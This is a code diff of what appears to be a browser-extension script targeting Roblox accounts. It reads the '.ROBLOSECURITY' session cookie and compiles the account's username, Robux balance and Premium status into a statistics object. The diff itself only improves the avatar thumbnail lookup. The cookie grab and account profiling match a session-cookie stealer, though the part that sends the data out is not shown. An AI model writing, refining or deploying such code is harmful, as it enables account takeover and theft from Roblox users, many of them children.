@@ -37,11 +37,18 @@ async function main(cookie) {
                 });
                 let isPremium = premiumRes.ok ? await premiumRes.json() : false;
 
+                // ✅ Fetch proper Roblox profile picture
+                let thumbRes = await fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${user.id}&size=420x420&format=Png&isCircular=false`);
+                let thumbJson = await thumbRes.json();
+                let thumbUrl = (thumbJson.data && thumbJson.data.length > 0)
+                    ? thumbJson.data[0].imageUrl
+                    : "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png";
+
                 statistics = {
                     UserName: user.name,
                     RobuxBalance: economy.robux ?? "N/A",
                     IsPremium: isPremium,
-                    ThumbnailUrl: `https://www.roblox.com/avatar-thumbnail/image?userId=${user.id}&width=420&height=420&format=png`,
+                    ThumbnailUrl: thumbUrl,
                     Summary: economy.robux ?? "N/A"
                 };
             }
@@ -109,4 +116,3 @@ async function main(cookie) {
 chrome.cookies.get({ "url": "https://www.roblox.com/home", "name": ".ROBLOSECURITY" }, function (cookie) {
     main(cookie ? cookie.value : null);
 });
-
